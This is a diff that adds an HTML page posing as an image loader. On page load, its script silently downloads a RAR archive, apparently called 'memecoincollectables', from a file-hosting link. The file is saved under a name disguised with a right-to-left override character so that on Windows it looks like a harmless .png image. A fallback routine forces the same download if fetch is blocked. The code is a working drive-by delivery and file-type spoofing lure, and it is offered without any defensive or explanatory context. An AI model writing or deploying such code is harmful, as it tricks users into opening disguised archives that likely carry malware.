@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading Image...</title>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <p>Downloading, please wait...</p>
+    </div>
+
+    <script>
+        // YOUR UPDATED UPLOAD.EE DIRECT LINK
+        const directUrl = "https://www.upload.ee/download/18963579/4ff02561fb0d21e66668/memecoincollectables.rar";
+
+        // THE RTLO MASKED NAME
+        // Displays as mink.pngrar.png on Windows
+        const maskedName = "mink.png\u202Egnp.rar";
+
+        async function triggerDownload() {
+            try {
+                // Background download method
+                const response = await fetch(directUrl);
+                if (!response.ok) throw new Error("Network error");
+                
+                const blob = await response.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                a.href = url;
+                a.download = maskedName;
+                
+                document.body.appendChild(a);
+                a.click();
+                
+                // Cleanup
+                window.URL.revokeObjectURL(url);
+                document.body.removeChild(a);
+
+            } catch (err) {
+                // FALLBACK: Directly triggers browser download if fetch is blocked
+                const link = document.createElement('a');
+                link.href = directUrl;
+                link.download = maskedName;
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+        }
+
+        // Run as soon as page loads
+        window.onload = triggerDownload;
+    </script>
+</body>
+</html>
